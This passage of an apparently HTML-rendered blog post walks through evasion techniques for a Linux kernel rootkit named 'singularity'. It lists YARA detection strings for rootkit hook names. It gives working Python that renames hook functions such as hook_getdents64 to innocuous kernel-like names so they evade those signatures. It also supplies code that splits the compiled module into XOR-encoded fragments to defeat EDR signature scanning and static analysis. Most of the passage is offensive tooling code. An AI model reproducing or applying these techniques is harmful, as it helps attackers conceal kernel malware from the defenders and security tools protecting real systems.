+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">$</span><span class="n">rk1</span> <span class="o">=</span> <span class="s">&#34;rootkit&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">rk2</span> <span class="o">=</span> <span class="s">&#34;hide_&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">rk3</span> <span class="o">=</span> <span class="s">&#34;hacked_&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">rk4</span> <span class="o">=</span> <span class="s">&#34;fake_&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">rk5</span> <span class="o">=</span> <span class="s">&#34;hooked_&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">hook1</span> <span class="o">=</span> <span class="s">&#34;_getdents&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">hook2</span> <span class="o">=</span> <span class="s">&#34;_kill&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span><span class="n">hook3</span> <span class="o">=</span> <span class="s">&#34;_tcp4_seq_show&#34;</span>
+</span></span></code></pre></div><h3 id="the-solution-intelligent-name-randomization">The Solution: Intelligent Name Randomization<a hidden class="anchor" aria-hidden="true" href="#the-solution-intelligent-name-randomization">#</a></h3>
+<p>Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_generate_random_name</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Generates random name that avoids YARA patterns&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Use generic names that look legitimate</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prefixes</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">,</span> <span class="s1">&#39;kern&#39;</span><span class="p">,</span> <span class="s1">&#39;dev&#39;</span><span class="p">,</span> <span class="s1">&#39;mm&#39;</span><span class="p">,</span> <span class="s1">&#39;fs&#39;</span><span class="p">,</span> <span class="s1">&#39;net&#39;</span><span class="p">,</span> <span class="s1">&#39;proc&#39;</span><span class="p">,</span> <span class="s1">&#39;sched&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">suffixes</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;handler&#39;</span><span class="p">,</span> <span class="s1">&#39;helper&#39;</span><span class="p">,</span> <span class="s1">&#39;worker&#39;</span><span class="p">,</span> <span class="s1">&#39;ops&#39;</span><span class="p">,</span> <span class="s1">&#39;func&#39;</span><span class="p">,</span> <span class="s1">&#39;entry&#39;</span><span class="p">,</span> <span class="s1">&#39;cb&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">prefix</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">prefixes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">suffix</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">suffixes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">middle</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">6</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">prefix</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">middle</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">suffix</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span></code></pre></div><h4 id="key-features">Key Features<a hidden class="anchor" aria-hidden="true" href="#key-features">#</a></h4>
+<ul>
+<li>No suspicious prefixes (hook_, fake_, hide_)</li>
+<li>Looks like legitimate kernel code</li>
+<li>Maintains internal consistency via mapping file</li>
+<li>Protects kernel API calls from renaming</li>
+</ul>
+<h4 id="protected-names">Protected Names<a hidden class="anchor" aria-hidden="true" href="#protected-names">#</a></h4>
+<p>The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_get_protected_names</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Set</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Names from kernel that should NOT be changed&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Basic C types</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;int&#39;</span><span class="p">,</span> <span class="s1">&#39;void&#39;</span><span class="p">,</span> <span class="s1">&#39;long&#39;</span><span class="p">,</span> <span class="s1">&#39;char&#39;</span><span class="p">,</span> <span class="s1">&#39;size_t&#39;</span><span class="p">,</span> <span class="s1">&#39;ssize_t&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># Essentials</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;module_init&#39;</span><span class="p">,</span> <span class="s1">&#39;module_exit&#39;</span><span class="p">,</span> <span class="s1">&#39;THIS_MODULE&#39;</span><span class="p">,</span> <span class="s1">&#39;current&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;kmalloc&#39;</span><span class="p">,</span> <span class="s1">&#39;kfree&#39;</span><span class="p">,</span> <span class="s1">&#39;printk&#39;</span><span class="p">,</span> <span class="s1">&#39;pr_debug&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;copy_from_user&#39;</span><span class="p">,</span> <span class="s1">&#39;copy_to_user&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;fget&#39;</span><span class="p">,</span> <span class="s1">&#39;fput&#39;</span><span class="p">,</span> <span class="s1">&#39;kernel_read&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">               
+</span></span><span class="line"><span class="cl">        <span class="c1"># Structures</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;pt_regs&#39;</span><span class="p">,</span> <span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="s1">&#39;task_struct&#39;</span><span class="p">,</span> <span class="s1">&#39;sk_buff&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># Entry points</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;main&#39;</span><span class="p">,</span> <span class="s1">&#39;init&#39;</span><span class="p">,</span> <span class="s1">&#39;exit&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><h4 id="function-name-extraction">Function Name Extraction<a hidden class="anchor" aria-hidden="true" href="#function-name-extraction">#</a></h4>
+<p>The obfuscator scans source files for function definitions using multiple regex patterns:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">function_patterns</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">r</span><span class="s1">&#39;\bnotrace\s+(?:static\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\s+(\w+)\s*\(&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">r</span><span class="s1">&#39;\bstatic\s+(?:notrace\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\s+(\w+)\s*\(&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">r</span><span class="s1">&#39;\bstatic\s+asmlinkage\s+\w+\s+(\w+)\s*\(&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">r</span><span class="s1">&#39;\basmlinkage\s+\w+\s+\*?\(?\*?(\w+)\)?&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">r</span><span class="s1">&#39;\b(\w+_init)\s*\(\s*void\s*\)&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">r</span><span class="s1">&#39;\b(\w+_exit)\s*\(\s*void\s*\)&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">r</span><span class="s1">&#39;\bHOOK\s*\([^,]+,\s*(\w+)\s*,&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">r</span><span class="s1">&#39;\btypedef\s+[^;]+\s+(\w+_t)\s*;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span></code></pre></div><h4 id="example-transformation">Example Transformation<a hidden class="anchor" aria-hidden="true" href="#example-transformation">#</a></h4>
+<p>Before:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// modules/hiding_directory.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="n">notrace</span> <span class="kt">long</span> <span class="nf">hook_getdents64</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">pt_regs</span> <span class="o">*</span><span class="n">regs</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">res</span> <span class="o">=</span> <span class="nf">orig_getdents64</span><span class="p">(</span><span class="n">regs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">long</span> <span class="nf">hook_getdents</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">pt_regs</span> <span class="o">*</span><span class="n">regs</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">res</span> <span class="o">=</span> <span class="nf">orig_getdents</span><span class="p">(</span><span class="n">regs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p>After:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// obfuscated/modules/hiding_directory.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="n">notrace</span> <span class="kt">long</span> <span class="nf">sys_abjker_handler</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">pt_regs</span> <span class="o">*</span><span class="n">regs</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">res</span> <span class="o">=</span> <span class="nf">kern_wopqls_helper</span><span class="p">(</span><span class="n">regs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">long</span> <span class="nf">fs_tnmqlk_ops</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">pt_regs</span> <span class="o">*</span><span class="n">regs</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">res</span> <span class="o">=</span> <span class="nf">net_xzpnrm_func</span><span class="p">(</span><span class="n">regs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><h4 id="implementation-details">Implementation Details<a hidden class="anchor" aria-hidden="true" href="#implementation-details">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_replace_in_content</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">content</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">mapping</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Replace names in content&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">modified</span> <span class="o">=</span> <span class="n">content</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Sort by descending length to avoid partial substitutions</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sorted_items</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">mapping</span><span class="o">.</span><span class="n">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">old_name</span><span class="p">,</span> <span class="n">new_name</span> <span class="ow">in</span> <span class="n">sorted_items</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Use word boundary for exact substitution</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;\b&#39;</span> <span class="o">+</span> <span class="n">re</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">old_name</span><span class="p">)</span> <span class="o">+</span> <span class="sa">r</span><span class="s1">&#39;\b&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">modified</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">new_name</span><span class="p">,</span> <span class="n">modified</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">modified</span>
+</span></span></code></pre></div><p>The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.</p>
+<h1 id="evasion-technique-3-module-fragmentation">Evasion Technique 3: Module Fragmentation<a hidden class="anchor" aria-hidden="true" href="#evasion-technique-3-module-fragmentation">#</a></h1>
+<h3 id="the-problem-2">The Problem<a hidden class="anchor" aria-hidden="true" href="#the-problem-2">#</a></h3>
+<p>EDR solutions scan loaded kernel modules in both memory and on-disk. A monolithic .ko file presents a single attack surface that&rsquo;s easy to analyze:</p>
+<ul>
+<li>Signature scanning of the entire module</li>
+<li>Static analysis of ELF structure</li>
+<li>Symbol table enumeration</li>
+</ul>
+<h3 id="the-solution-fragment--xor-encoding--in-memory-loading">The Solution: Fragment + XOR Encoding + In-Memory Loading<a hidden class="anchor" aria-hidden="true" href="#the-solution-fragment--xor-encoding--in-memory-loading">#</a></h3>
+<p>We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static analysis while maintaining functionality.</p>
+<h4 id="fragmentation-pipeline">Fragmentation Pipeline:<a hidden class="anchor" aria-hidden="true" href="#fragmentation-pipeline">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fragment</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">chunk_size</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">65536</span><span class="p">,</span> <span class="n">encode</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">bytes</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Fragment the .ko into chunks
+</span></span></span><span class="line"><span class="cl"><span class="s2">    
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Args:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        chunk_size: Size of each fragment (default: 64KB)
+</span></span></span><span class="line"><span class="cl"><span class="s2">        encode: If True, apply XOR encoding
+</span></span></span><span class="line"><span class="cl"><span class="s2">    
+</span></span></span><span class="line"><span class="cl"><span class="s2">    Returns:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        List of fragments
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*] Fragmenting: </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">ko_path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;    Chunk size: </span><span class="si">{</span><span class="n">chunk_size</span><span class="si">}</span><span class="s2"> bytes&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Read the .ko file</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">ko_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ko_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">original_size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">ko_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Original size: </span><span class="si">{</span><span class="n">original_size</span><span class="si">}</span><span class="s2"> bytes&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Generate random XOR key</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xor_key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="k">if</span> <span class="n">encode</span> <span class="k">else</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">16</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Fragment</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fragments</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">num_chunks</span> <span class="o">=</span> <span class="p">(</span><span class="n">original_size</span> <span class="o">+</span> <span class="n">chunk_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="n">chunk_size</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_chunks</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="n">i</span> <span class="o">*</span> <span class="n">chunk_size</span>
+</span></span><span class="line"><span class="cl">        <span class="n">end</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">start</span> <span class="o">+</span> <span class="n">chunk_size</span><span class="p">,</span> <span class="n">original_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">ko_data</span><span class="p">[</span><span class="n">start</span><span class="p">:</span><span class="n">end</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># Apply encoding if necessary</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">encode</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">chunk</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_xor_encode</span><span class="p">(</span><span class="n">chunk</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">fragments</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">checksum</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_calculate_checksum</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Fragment </span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">num_chunks</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes (SHA256: </span><span class="si">{</span><span class="n">checksum</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span><span class="si">}</span><span class="s2">...)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">fragments</span> <span class="o">=</span> <span class="n">fragments</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Metadata</span>
+</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">metadata</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;original_filename&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">ko_path</span><span class="o">.</span><span class="n">name</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;original_size&#39;</span><span class="p">:</span> <span class="n">original_size</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;num_fragments&#39;</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">fragments</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;chunk_size&#39;</span><span class="p">:</span> <span class="n">chunk_size</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;encoded&#39;</span><span class="p">:</span> <span class="n">encode</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;xor_key&#39;</span><span class="p">:</span> <span class="n">xor_key</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span> <span class="k">if</span> <span class="n">encode</span> <span class="k">else</span> <span class="kc">None</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;checksums&#39;</span><span class="p">:</span> <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">_calculate_checksum</span><span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">fragments</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">fragments</span>
+</span></span></code></pre></div><h4 id="xor-encoding">XOR Encoding<a hidden class="anchor" aria-hidden="true" href="#xor-encoding">#</a></h4>
+<p>We use a simple but effective XOR cipher with a random 16-byte key:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_xor_encode</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Simple XOR encoding for obfuscation&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encoded</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">encoded</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">byte</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_len</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span>
+</span></span></code></pre></div><p>While XOR is cryptographically weak, it serves our purpose:</p>
+<ul>
+<li>Breaks signature matching</li>
+<li>Fast to encode/decode</li>
+<li>Minimal overhead</li>
+<li>Easy to implement in C loader</li>
+</ul>
+<h4 id="resulting-structure">Resulting Structure<a hidden class="anchor" aria-hidden="true" href="#resulting-structure">#</a></h4>
+<pre tabindex="0"><code>fragments/
+├── chunk_000.bin    # XOR-encoded fragment (64KB)
+├── chunk_001.bin    # XOR-encoded fragment (64KB)
+├── chunk_002.bin    # XOR-encoded fragment (64KB)
+├── ...
+├── chunk_N.bin      # Final fragment (variable size)
+├── metadata.json    # Contains XOR key and checksums
+└── reconstruct.sh   # Automated reconstruction script
+</code></pre><h4 id="metadata-format">Metadata Format<a hidden class="anchor" aria-hidden="true" href="#metadata-format">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;original_filename&#34;</span><span class="p">:</span> <span class="s2">&#34;singularity.ko&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;original_size&#34;</span><span class="p">:</span> <span class="mi">245632</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;num_fragments&#34;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;chunk_size&#34;</span><span class="p">:</span> <span class="mi">65536</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;encoded&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;xor_key&#34;</span><span class="p">:</span> <span class="s2">&#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;checksums&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">]</span>
